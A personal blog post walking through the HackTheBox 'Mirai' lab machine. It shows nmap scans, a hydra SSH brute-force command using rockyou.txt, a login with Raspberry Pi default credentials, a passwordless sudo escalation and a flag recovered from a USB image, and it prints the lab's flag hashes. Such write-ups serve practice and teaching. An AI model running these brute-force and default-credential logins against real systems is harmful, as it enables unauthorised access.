---
layout: post
title: "HackTheBox - Hacking Mirai"
date: 2018-02-10 16:00:00
tags: hackthebox ctf 
description: HackTheBox was the first CTF site that I actually played with. Hacking Mirai was great, using previous knowledge, getting to learn new stuff. It felt awesome when the root hash was accepted. I hope you have fun reading.
---

### **Disclaimer:** 
As by the ToS of HackTheBox, solutions cannot be posted before the machine is retired, so you won't be able to use this post as your way into the described machine, since it'll already be out-of-service.

# Preface
HackTheBox was the first CTF site that I signed up and actually got my hands dirty. The experience is being awesome. If you want somewhere to practice, gather more knowledge, or have some fun, give it a try: https://www.hackthebox.eu/invite
**Reminder:** You have to hack your way in to the registration process. It is worth.

# Let's begin
As my first CTF machine, I've chosen Mirai due the difficulty ratings on the list of available machines: Mirai was the lowest hanging fruit. It's IP was `10.10.10.48`. Let the games begin!

## Enumerating
> On my machine
{:.filename}
{% highlight text %}
{% raw %}
root@kali:~# nmap -sS -A -T5 10.10.10.48

Starting Nmap 7.60 ( https://nmap.org ) at 2018-02-02 23:24 -02
Nmap scan report for 10.10.10.48
Host is up (0.26s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
| ssh-hostkey: 
|   1024 aa:ef:5c:e0:8e:86:97:82:47:ff:4a:e5:40:18:90:c5 (DSA)
|   2048 e8:c1:9d:c5:43:ab:fe:61:23:3b:d7:e4:af:9b:74:18 (RSA)
|   256 b6:a0:78:38:d0:c8:10:94:8b:44:b2:ea:a0:17:42:2b (ECDSA)
|_  256 4d:68:40:f7:20:c4:e5:52:80:7a:44:38:b8:a2:a7:52 (EdDSA)
53/tcp open  domain  dnsmasq 2.76
| dns-nsid: 
|_  bind.version: dnsmasq-2.76
80/tcp open  http    lighttpd 1.4.35
|_http-server-header: lighttpd/1.4.35
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Aggressive OS guesses: Linux 3.12 (95%), Linux 3.13 (95%), Linux 3.16 (95%), Linux 3.18 (95%), Linux 3.2 - 4.8 (95%), Linux 3.8 - 3.11 (95%), Linux 4.2 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.1 (93%), Linux 3.2 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1025/tcp)
HOP RTT       ADDRESS
1   259.10 ms 10.10.14.1
2   258.63 ms 10.10.10.48

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.05 seconds
{% endraw %}
{% endhighlight %}

That's good. We have a SSH and HTTP service to work on. I'd have started brute-forcing on SSH immediately if I knew any users, so I put it aside for the moment.

### HTTP server
Accessing http://10.10.10.48 returned an empty page. 

![img]({{ '/assets/images/mirai/empty-http.png' | relative_url}}){: .center-image}*Empty page on http://10.10.10.48*

Nothing to work with. So I fired up ``nmap`` again with some native scripts to see if any of them returned stuff I could further explore. The interesting results are below.

> On my machine
{:.filename}
{% highlight text %}
{% raw %}
# Nmap 7.60 scan initiated Fri Feb  2 23:29:50 2018 as: nmap -O -A -sS --script=default,vuln -T5 -o nmap-out2.txt 10.10.10.48
Nmap scan report for 10.10.10.48
Host is up (0.25s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
| ssh-hostkey: 
|   1024 aa:ef:5c:e0:8e:86:97:82:47:ff:4a:e5:40:18:90:c5 (DSA)
|   2048 e8:c1:9d:c5:43:ab:fe:61:23:3b:d7:e4:af:9b:74:18 (RSA)
|   256 b6:a0:78:38:d0:c8:10:94:8b:44:b2:ea:a0:17:42:2b (ECDSA)
|_  256 4d:68:40:f7:20:c4:e5:52:80:7a:44:38:b8:a2:a7:52 (EdDSA)
53/tcp open  domain  dnsmasq 2.76
| dns-nsid: 
|_  bind.version: dnsmasq-2.76
80/tcp open  http    lighttpd 1.4.35
| http-cookie-flags: 
|   /admin/: 
|     PHPSESSID: 
|       httponly flag not set
|   /admin/index.php: 
|     PHPSESSID: 
|_      httponly flag not set

... info removed ...

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Feb  2 23:32:04 2018 -- 1 IP address (1 host up) scanned in 133.64 seconds
{% endraw %}
{% endhighlight %}

Now we know about the existence of ``/admin/`` and ``/admin/index.php`` (that end up both returning the same page).
![img]({{ '/assets/images/mirai/pi-hole.png' | relative_url}}){: .center-image}*Pi-hole page at http://10.10.10.48/admin*

While searching about Pi-hole, I found it's github repository. From there, I started looking for possible users that might be used on the Mirai machine, ending up discovering `pihole`.

Since it was the easiest machine at the time, I assumed that it would be enough to proceed.

### Release the `hydra`
I went forward and fired up `hydra`

> On my machine
{:.filename}
{% highlight text %}
{% raw %}
hydra -l pihole -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.48 -t 20 -V
{% endraw %}
{% endhighlight %}

`rockyou.txt` is fairly large, so after some minutes I thought I could go have dinner while `hydra` did it's thing, not putting so much faith on the outcome, honestly.

With refreshed mind, I came back and noticed that I'd forgotten to add `-e nsr`, so I went ahead and tested some combinations manually aswell. The followed combinations resulted in nothing.
{% highlight text %}
{% raw %}
pihole:pihole
pihole:elohip
pihole:pi
{% endraw %}
{% endhighlight %}

Suddenly, I had the epiphany. Damn, it might be a Raspberry Pi which had the default credentials `pi:raspberry`.
> On my machine
{:.filename}
{% highlight text %}
{% raw %}
root@kali:~# ssh pi@10.10.10.48
pi@10.10.10.48's password: 

pi@raspberrypi:~ $ 
{% endraw %}
{% endhighlight %}

Great! I was in!

> On the server
{:.filename}
{% highlight text %}
{% raw %}
pi@raspberrypi:~ $ ls
background.jpg  Documents  list.dir  oldconffiles  Public        root.dir   root.txt   Videos
Desktop         Downloads  l.dir  Music     Pictures      python_games  root.list  Templates
{% endraw %}
{% endhighlight %}

Seeing `root.txt` made me `cat root.txt` but it was empty. It was probably left behind by other people as other files on the same directory.

### Getting the `user` flag
Getting the user flag was pretty straightforward:
> On the server
{:.filename}
{% highlight text %}
{% raw %}
pi@raspberrypi:~ $ find . -name 'user.txt'
./Desktop/user.txt
find: `./Desktop/lost+found': Permission denied

pi@raspberrypi:~ $ cat ./Desktop/user.txt
ff837707441b257a20e32199d7c8838d
{% endraw %}
{% endhighlight %}
One down. Let's root it now!

### Getting the `root` flag
Another thing that Raspbian has is being able to `sudo` without a password. 
> On the server
{:.filename}
{% highlight text %}
{% raw %}
pi@raspberrypi:~ $ sudo su
root@raspberrypi:/home/pi#
root@raspberrypi:/home/pi# cd ~
root@raspberrypi:~# pwd
/root
{% endraw %}
{% endhighlight %}

As I `ls`'ed on /root I saw:
> On the server
{:.filename}
{% highlight text %}
{% raw %}
root@raspberrypi:~# ls
recovered files  root.txt
root@raspberrypi:~# cat root.txt 
I lost my original root.txt! I think I may have a backup on my USB stick...
{% endraw %}
{% endhighlight %}
It was almost a 'not so fast, young man'. That engaged me more on the challenge.

To find the mounted partitions, I ran `df -h`
> On the server
{:.filename}
{% highlight text %}
{% raw %}
root@raspberrypi:~# df -h
Filesystem      Size  Used Avail Use% Mounted on
aufs            8.5G  2.8G  5.3G  35% /
tmpfs           101M   13M   88M  13% /run
/dev/sda1       1.3G  1.3G     0 100% /lib/live/mount/persistence/sda1
/dev/loop0      1.3G  1.3G     0 100% /lib/live/mount/rootfs/filesystem.squashfs
tmpfs           251M     0  251M   0% /lib/live/mount/overlay
/dev/sda2       8.5G  2.8G  5.3G  35% /lib/live/mount/persistence/sda2
devtmpfs         10M     0   10M   0% /dev
tmpfs           251M  8.0K  251M   1% /dev/shm
tmpfs           5.0M  4.0K  5.0M   1% /run/lock
tmpfs           251M     0  251M   0% /sys/fs/cgroup
tmpfs           251M  8.0K  251M   1% /tmp
/dev/sdb        8.7M   93K  7.9M   2% /media/usbstick
tmpfs            51M     0   51M   0% /run/user/999
tmpfs            51M     0   51M   0% /run/user/1000
{% endraw %}
{% endhighlight %}
There you are.

> On the server
{:.filename}
{% highlight text %}
{% raw %}
root@raspberrypi:~# cd /media/usbstick
root@raspberrypi:/media/usbstick# ls
damnit.txt  lost+found
root@raspberrypi:/media/usbstick# cat damnit.txt 
Damnit! Sorry man I accidentally deleted your files off the USB stick.
Do you know if there is any way to get them back?

-James
{% endraw %}
{% endhighlight %}

Damn it, James! `lost+found` had nothing. Well, maybe James tried to recover the file. Let's check the `history` (only the relevant info is shown).

> On the server
{:.filename}
{% highlight text %}
{% raw %}
root@raspberrypi:/media/usbstick/lost+found# history
   39  extundelete 
   58  cd .local/
   60  cd share/
   62  cd Trash/
   64  cd files/
{% endraw %}
{% endhighlight %}

I `ls`'ed `/home/pi/.local/share/Trash/files` but there was nothing relevant. Let's try this `extundelete` command.

> On the server
{:.filename}
{% highlight text %}
{% raw %}
root@raspberrypi:/media/usbstick/lost+found# extundelete -h
bash: extundelete: command not found
{% endraw %}
{% endhighlight %}

I naïvely tried installing it via `apt`. The box couldn't communicate with the outer-world.

I searched about `extundelete` and found it's sourceforce page, where I spent a few minutes learning about it. That's when I saw:
{% highlight text %}
{% raw %}
Typically, you would replace "partition" in the above examples by a device name like "sda4" or "hdb7". When either of those commands successfully completes, you can now take the next steps leisurely - you will no longer make anything worse by waiting. If you would like to make a backup of your partition, you may do so by a command such as:
$ dd bs=4M if=/dev/partition of=partition.backup
{% endraw %}
{% endhighlight %}
It made a lot of sense. If I could make a backup of the usb stick and download it, I could mount the backup it on my machine and run `extundelete` locally, since it was only 8MB (check `df -h` output) and it could be downloaded easily. And so I proceeded. I ran `dd if=/dev/sdb of=usb_backup bs=1M` and downloaded it via `scp`.
Before searching the proper way to mount a file as a directory, why not run `strings usb_backup`?

> On the server
{:.filename}
{% highlight text %}
{% raw %}
root@kali:~# strings usb_backup
>r &
/media/usbstick
lost+found
root.txt
damnit.txt
>r &
>r &
/media/usbstick
lost+found
root.txt
damnit.txt
>r &
/media/usbstick
2]8^
lost+found
root.txt
damnit.txt
>r &
3d3e483143ff12ec505d026fa13e020b
Damnit! Sorry man I accidentally deleted your files off the USB stick.
Do you know if there is any way to get them back?
-James
{% endraw %}
{% endhighlight %}

There you are, *root hash*!

## Wrapping up
I was my first CTF machine, so some actions were naïve and I overthought a lot, that made me miss some kind of obvious stuff at first glance. It felt very good to start with an IP and work my way in using some knowledge I previously had, get a shell on the machine and finally some out-of-the-box thinking to find the root hash. If it wasn't for the previously knowledge about the default credentials of Raspbian, it'd have taken a LOT of time to get in. . It motivated me more to keep working on these machines, gaining knowledge and having fun (and sometimes wanting to hit my head on the wall :)

exit(0);
